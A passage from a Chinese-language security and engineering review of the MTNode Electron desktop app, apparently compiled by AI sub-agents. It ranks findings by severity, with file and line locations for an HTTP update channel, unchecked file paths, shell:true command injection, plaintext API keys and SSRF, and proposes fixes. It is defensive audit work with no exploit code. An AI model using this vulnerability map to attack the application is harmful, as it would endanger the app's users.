- 路径校验用 `relToAbs()`（✅ 正确模式）
- 文本导入 16 MB 上限，扫描 4000 文件上限
- ⚠️ `.trash/` 无限增长，无自动清理

**Rollback store**（`rollback-store.js` 933 行）：
- Content-addressed 对象存储（SHA256）
- 两层级目录（hash[0:2] 做子目录）
- 默认保留 20 轮 / 会话，2 GB 上限
- ⚠️ GC 需手动调用，无后台自动 GC
- 路径校验用 **denylist**（`PROTECTED_DIRS`）——比 assets-store 的 allowlist 弱

**对比参考（当前仓库 simpleAI/VEA）**：
- VEA 的 `VertexStoreV4` 也是 SQLite + WAL，也有 `edge_metrics` 表，也有快照（`snapshots/{session_id}/step_xxxx.json`）
- **共同点**：都是 SQLite + WAL + 内容寻址快照；都是参数化查询
- **差异**：VEA 快照是「完整 Graph JSON」（自包含、可回放）；MTNode rollback 是「content-addressed 对象 + 轮次索引」（更像 git 对象库）
- VEA 的 `apply_merge_strategy` 有 `JSON_MERGE` / `LIST_APPEND` / `OVERWRITE` / `REDUCER_SCRIPT`；MTNode 无对应概念（rollback 只做「整文件恢复」）

### 6.5 数据持久化地图（`%APPDATA%\pipeline-console\`）

```
pipeline-console/
├── config.json                     # 主配置（providers 含明文 API key）
├── config-backups/                  # 自动备份（最近 30 份，全明文）
├── .mtnode-db.sqlite                # SQLite 事实库
├── media-gen-job-lock.json          # 全局媒体生成互斥锁
├── rollback/                        # 快照/回滚存储
│   ├── objects/<hash[0:2]>/<sha256>
│   └── rounds/<sessionId>/
├── asset-lib/                       # 素材库（默认根）
├── tools/                           # 工具库
├── music3/, h3/, tts/, llama/       # 各后端数据
├── pet/                             # 桌宠数据
├── dsh-home/                        # DSH agent 家目录
│   └── sessions/<sid>/session.jsonl[.zstd]
├── app-plugins/                     # 应用插件
└── workspace/                       # 默认工作区
```

**⚠️ 观察**：凭据在 `config.json` 与 `config-backups/` 里是明文；DSH sessions 在 `dsh-home/sessions/` 里是**明文 JSONL**（可 zstd 压缩但**未加密**）。

---

## 7. 打包 / 更新 / CI / 测试评审

### 7.1 发布矩阵

| 渠道 | 状态 | 备注 |
|:--|:--|:--|
| NSIS 安装包（主） | ⚠️ **不可复现** | `build.json` 与 `installer.nsh` 缺失 |
| MSIX（Microsoft Store） | ⚠️ **不可复现** | `scripts/msix/` 缺失 |
| Store SaaS（创意工坊） | ✅ 存在 | `store-saas/` 完整，SFTP 部署 |
| ext-repo（扩展云发版） | ✅ 存在 | `ext-repo/` 完整 |

### 7.2 🔴 CRITICAL：构建配置缺失

`.gitignore` 显式排除 `build.json`、`installer.nsh`、`scripts/`。这意味着：

- **开源用户无法从源码构建**——`npm run dist` 直接失败（`electron-builder --config build.json` 找不到配置文件）
- **AGENTS.md:11-12 声明的「根目录新模块必须进 `build.json files` 白名单」**——无法验证
- **AGENTS.md:35 提到「已发生过 `assets-store.js` 遗漏」**——历史 bug 无自动化防护

**同时**：`dist_check/win-unpacked/resources/app.asar` (1.3 MB) 是**已提交的构建产物**——违反常规做法（构建产物不进 VCS），但 AGENTS.md:23 明确列为「不要修改」，暗示这是参考构建。

**建议**：
1. 把 `build.json`、`installer.nsh` 提交进仓库
2. 至少把 `scripts/` 里能公开的脚本（`app-deps-usage.mjs`、`app-deps-check.mjs` 等诊断脚本）提交
3. 加 CI 检查：解析 `main.js` 的 `require("./xxx")` 与 `build.json files` 白名单是否一致

### 7.3 🔴 CRITICAL：无 CI/CD

`.github/workflows/` 目录不存在。

- 无 PR 检查、无 branch protection、无 nightly build
- 无自动测试——11K 行测试全靠开发者手动跑
- 无覆盖率报告

**建议**：至少加 GitHub Actions：
- `test.yml`：`npm test`（当前无 test runner，需引入 `jest` 或 `node --test`）
- `build.yml`：`npm run dist`（前提是补回 `build.json`）
- `lint.yml`：`eslint`（当前无 eslint 配置）

### 7.4 测试清单（18 个文件，~11K 行）

| 文件 | 大小 | 覆盖 |
|:--|:--|:--|
| `smoke-dev-suggest.js` | 139 KB | 开发节点建议（最大测试文件） |
| `layout-agent-plan.js` | 65 KB | 布局 agent 计划 |
| `smoke-plan-dialog.js` | 91 KB | 计划对话框 |
| `smoke-node-browse-view.js` | 34 KB | 节点浏览视图 |
| `smoke-rel-layout.js` | 33 KB | 关系布局 |
| `smoke-workflow-delete.js` | 32 KB | 工作流删除 |
| `smoke-global-refs.js` | 25 KB | 全局引用 |
| `smoke-workspace-project.js` | 22 KB | 工作区项目 |
| `smoke-prompt-caret.js` | 21 KB | 提示词光标 |
| `smoke-ref-keyboard.js` | 15 KB | 引用键盘导航 |
| `smoke-node-state-sel.js` | 12 KB | 节点状态选择 |
| `smoke-agent-lang.js` | 6.7 KB | Agent 语言 |
| `smoke-exec-detached.js` | 6.2 KB | 脱离执行 |
| `smoke-db-dsh.mjs` | 7.6 KB | DB + DSH 集成 |
| `smoke-db.js` | 4.1 KB | 数据库 |
| `smoke-dsh-default-model.js` | 3.2 KB | DSH 模型 |
| `smoke-token-report.mjs` | 7.4 KB | Token 使用报告 |
| `fts5-check.js` | 582 B | FTS5 检查 |

**测试形态**：纯 Node 脚本，`fs.readFileSync` 解析源码 + VM sandbox 执行逻辑。**无浏览器自动化**（无 Puppeteer/Playwright），**无端到端测试**。

**缺口**：
- ❌ `test/smoke-dialog-persistence.js`（AGENTS.md 明确引用但缺失）
- ❌ `updater.js` (379 行) 零覆盖
- ❌ `crash-report.js` (443 行) 零覆盖
- ❌ `main.js` 120 个 IPC handler 零覆盖
- ❌ 构建 / 打包测试
- ❌ 扩展 / 插件加载测试
- ❌ MSIX 打包测试（脚本本身缺失）

### 7.5 凭据管理（发布侧）

- **SSH 凭据**：`store-saas/upload.py:18`、`ext-repo/upload.py:18` 硬编码 `E:\dev\mt-ai-router\.vscode\sftp.json`
- **Store 账号**：`store-saas/seed-skills.mjs:25` 硬编码 `ms2308`
- **无 OAuth、无 API token、无 2FA**

**建议**：用 GitHub Actions secrets + OIDC 部署，凭据不进仓库。

### 7.6 版本一致性 ✅

- `version` 文件 = `package.json.version` = `1.2.8`
- `version.js` 提供 `bump` 工具，正则校验 semver
- `CHANGELOG-v1.1.md` (59 KB) 按版本维护，结构化好
- **缺口**：无 pre-commit hook 强制版本一致性；CHANGELOG 条目与 git commit 无关联

---

## 8. 与当前仓库 (simpleAI/VEA) 的对照

同为作者 **shaomang** 的姊妹项目，MTNode 与 VEA 在**架构理念上有大量呼应**，但在**实现层次上各有取舍**：

### 8.1 共同点

| 概念 | MTNode | VEA (simpleAI) |
|:--|:--|:--|
| 节点 + 边数据模型 | 画布节点 + 连线 | Vertex + Edge |
| 状态持久化 | SQLite (WAL) | SQLite (WAL) |
| 快照 / 时间旅行 | `rollback-store.js` (content-addressed 对象 + 轮次索引) | `snapshots/{session_id}/step_xxxx.json` (完整 Graph JSON) |
| 指标跟踪 | `edge_metrics` 概念 | `edge_metrics` 表 |
| 子图 / 超级节点 | 超级节点（选区合并） | Nested Subgraphs（`subgraph` 属性） |
| 工具目录 | `mtnode_db`, `mtnode_canvas_*` | `ToolEdgeV4`, `LLMToolEdgeV4` |
| 意图路由 | DSH gateway 工具可见性裁剪 | SenseNova LLM 路由 + 子图热缝合 |
| OpenAI 兼容 | DSH `/v1/chat/completions` | VEA `/v1/chat/completions` |

### 8.2 关键差异

| 维度 | MTNode | VEA |
|:--|:--|:--|
| 语言 | JavaScript / TypeScript (Electron) | Python |
| 用户界面 | 桌面视觉画布 (SVG) | REST API + 简单 Dashboard |
| 执行模型 | 桌面进程调度 + 子进程后端 | Python asyncio 协程并发 |
| 智能引擎 | 内嵌 DeepSeek Harness | 自研 Vertex-Edge 引擎 |
| 目标用户 | 普通用户（一键开关） | 开发者（Python SDK + CLI） |
| 安全模型 | IPC + preload 桥（信任边界在 preload） | HTTP API + API key（信任边界在端口） |
| 部署形态 | 桌面单例 | 服务器（端口 11434） |

### 8.3 可借鉴之处

**VEA → MTNode**：
- VEA 的「HTTP API 绑定 `127.0.0.1` 默认，非回环必须带 API key」模型（VEA agent.md:324-328）——MTNode 本地后端可考虑类似策略（本地后端可选项：默认无认证，可选开启 API key）
- VEA 的「自定义边零注册」（`my_edge.py:MyEdge` 脚本路径即类型）——MTNode 的技能系统可以借鉴「脚本路径即类型」的零注册模式
- VEA 的「快照是完整 Graph JSON，自包含可回放」——MTNode rollback 的「content-addressed + 轮次索引」可以补充「完整 Graph JSON 导出」选项
- VEA 的「CSP / CORS / 安全默认值」文档化——MTNode 的安全姿态值得写进一份 `SECURITY.md`

**MTNode → VEA**：
- MTNode 的「DSH 3 层契约 + 降级保底」——VEA 的 OpenAI 兼容层也可以做类似解耦
- MTNode 的「运行时池化 + LRU 上限」——VEA 的 LLM 连接池可借鉴
- MTNode 的「工具可见性裁剪」（lean/noCanvas/hideTools 三通道）——VEA 的 ToolEdge 可借鉴「按运行上下文裁剪可见工具」

---

## 9. 全部发现按严重级别汇总

### 🔴 CRITICAL（8 项）

1. **更新通道用 HTTP** — `updater.js:20` — MITM 可投递恶意二进制
2. **文件读写无路径校验** — `main.js:1241-1269` — 渲染层可读写任意绝对路径
3. **进程执行命令注入** — `main.js:1438-1476` + `main-proc-host.js:79` — `shell:true` 允许命令拼接
4. **API key 明文存储** — `config-providers.js` — 30 份明文备份
5. **构建配置缺失** — `build.json` / `installer.nsh` / `scripts/` 全部缺失 — 不可复现
6. **无 CI/CD** — `.github/workflows/` 缺失 — 无自动化质量门
7. **DSH 插件无签名** — `dsh/gateway/gateway.mjs:2745-2778` — 供应链攻击面
8. **MCP 服务器无沙箱** — `dsh/gateway/gateway.mjs:2818-2896` — 任意命令执行

### 🟠 HIGH（10 项）

1. **主窗口 `sandbox: false`** — `main.js:3607`
2. **`webviewTag: true` 未使用** — `main.js:3608`
3. **`shell:openPath` 接受任意路径** — `main.js:1402`
4. **`net:fetch` SSRF** — `main.js:2038`
5. **`file:listDir` 无深度限制** — `main.js:1319`
6. **本地后端孤儿进程** — `music3/main-music3.js:1484` 等
7. **`smoke-dialog-persistence.js` 缺失** — AGENTS.md:43 引用但文件不存在
8. **无代码签名** — 无证据
9. **关键子系统 0 测试覆盖** — `updater.js` / `crash-report.js` / `main.js` IPC
10. **明文 SSH 凭据硬编码** — `store-saas/upload.py:18`

### 🟡 MEDIUM（14 项）

1. CSP 保留 `'unsafe-eval'`（renderer/index.html:5）
2. 双打包工具共存（electron-packager + electron-builder）无说明
3. `media-gen-global-lock.js` 非原子获取（race window）
4. SQLite 无 schema 迁移系统
5. 端口硬编码无冲突检测（7860 / 8188）
6. `.trash/` 无限增长无自动清理
7. Rollback store GC 需手动调用
8. Rollback 路径校验用 denylist（弱于 assets-store 的 allowlist）
9. 渲染层 `innerHTML` 违反自身声明的 textContent 规范
10. `dist_check/` 提交构建产物（1.3 MB app.asar）
11. Store 账号硬编码 `ms2308`
12. 技能版本冲突无检测（同步覆盖用户编辑）
13. **本地后端跨目录 require**（`music3/`、`h3/`、`tts/`、`llama/`、`pet/` 跨入 `../dsh/`、`../plugins/`、`../config-providers.js`、`../media-gen-global-lock.js`）——违反模块隔离
14. **`pet-pack/package-lock.json` 已提交**——违反 AGENTS.md:30「`*-pack/` 依赖锁文件不提交」

### 🟢 LOW（10 项）

1. 根目录 `app.js` (171 KB) 疑似 legacy 未清理
2. 无 eslint / prettier 配置
3. 无 pre-commit hook
4. `renderer/app.js` 1MB 单文件，1,021 顶层声明
5. 全局 `S` 状态对象无命名空间
6. 主题系统只有 3 个硬编码主题
7. 画布无障碍仅鼠标（无键盘替代）
8. AGENTS.md 提到 v1.1.28，实际版本 1.2.8（文档滞后）
9. `$null`、`.agent-md-write-probe.tmp` 根目录垃圾文件
10. 无 TypeScript 类型

---

## 10. 修复优先级建议

### P0 — 立即修复（本周）

1. **更新通道切 HTTPS**（`updater.js:20` 一行改动）
2. **文件读写加路径白名单**（参照 `assets-store.js:140-152` 的 `relToAbs` 模式）
3. **禁用 `proc:run` 的 `shell:true`** 或加可执行文件白名单
4. **API key 用 DPAPI / Keychain 加密**（`config-providers.js`）
5. **提交 `build.json` + `installer.nsh`**（否则开源用户无法构建）

### P1 — 短期修复（1-2 周）

6. **主窗口 `sandbox: true`**，移除 `webviewTag: true`（除非确认需要）
7. **移除 CSP 的 `'unsafe-eval'`**（注释说兼容余量但函数节点已迁出）
8. **补回 `scripts/` 或文档化替代发布流程**
9. **创建 `test/smoke-dialog-persistence.js`**（AGENTS.md 已承诺）
10. **加 GitHub Actions**（至少 `npm test` + `npm run deps:check`）
11. **`shell:openPath` 加路径校验**
12. **本地后端加端口探测 / 动态分配**

### P2 — 中期改进（1-2 月）

13. **DSH 插件签名验证**（hash + 代码签名）
14. **MCP 服务器资源限制**（cgroup / 容器 / 进程隔离）
15. **`net:fetch` 屏蔽内网段**（防 SSRF）
16. **SQLite schema 迁移系统**（版本表 + 迁移脚本）
17. **`.trash/` 自动清理**（保留最近 N 天 / 最大 MB）
18. **Rollback GC 后台化**（创建新轮次时触发）
19. **Windows Job Object 绑后端生命周期**（防孤儿进程）
20. **清理根目录 legacy `app.js`**
21. **把跨目录 require 的共享工具抽到 `common/` 目录**（后端不再跨入 `../dsh/`、`../plugins/`）
22. **删除 `pet-pack/package-lock.json`**（违反 AGENTS.md:30）
23. **从 .gitignore 移除 `docs/` 与 `test/`**（它们已被追踪，留在 ignore 列表会让新克隆者困惑）

### P3 — 长期优化（季度级）

21. 引入 Vite/esbuild 做生产构建（保留 dev 无构建）
22. `renderer/app.js` 拆分 + `S` 命名空间化
23. 浏览器端到端测试（Playwright）
24. 视觉回归测试
25. 画布无障碍（ARIA grid + 键盘节点选择）
26. TypeScript 迁移（渲染层 + 主进程）
27. 编写 `SECURITY.md`（安全姿态文档化）
28. 技能版本冲突检测（同步前比较 version 字段）

---

## 11. 总体评价

**MTNode AI 编排器是一个架构自觉、功能密集、文档扎实的桌面应用**。DSH 集成的 3 层契约（`dsh/DESIGN.md` 826 行）是本次评审中**最成熟的架构设计**——解耦、降级保底、版本锁定原则都做得很到位。渲染层的「无框架 SVG」决策在功能密度上可行，画布变换管线清晰有优化。

**但安全基础设施存在系统性缺口**：
- **更新通道 HTTP** 是桌面应用不可接受的（MITM 可直接投递恶意二进制）
- **IPC 表面过大**（120 个 handler）且**信任模型不一致**（`assets-store.js` 做了正确的路径校验，`main.js` 的 `file:*` 完全没做）
- **构建 / CI / 测试**三件套几乎全缺——开源用户无法从源码构建，PR 无自动化质量门
- **凭据管理**在 DSH 层做得对（env 注入不落盘），但主进程 `config-providers.js` 落盘明文 + 30 份备份

**最严重的 5 个修复**（§10 P0）都是**单点修改**——更新 URL 一行、路径校验参照已有模式、禁用 `shell:true`、加密 config、提交缺失文件。如果作者愿意优先处理这些，MTNode 的安全姿态可以在 1-2 周内显著提升。

**与 VEA (simpleAI) 的对照**：两个项目是同一作者的不同切面——MTNode 面向普通用户（桌面视觉画布），VEA 面向开发者（Python SDK + HTTP API）。两者在「节点+边」「SQLite + WAL」「快照」上理念呼应，但实现层次各有取舍。MTNode 的 DSH 3 层契约值得 VEA 借鉴；VEA 的安全默认值与零注册自定义边值得 MTNode 借鉴。

---

*评审完成。6 个子代理共产出 ~4000 行详细分析，本报告为综合提炼版。各子代理的完整报告保存在 `/tmp/mtnode-aio-*.md` 供深入查阅。*
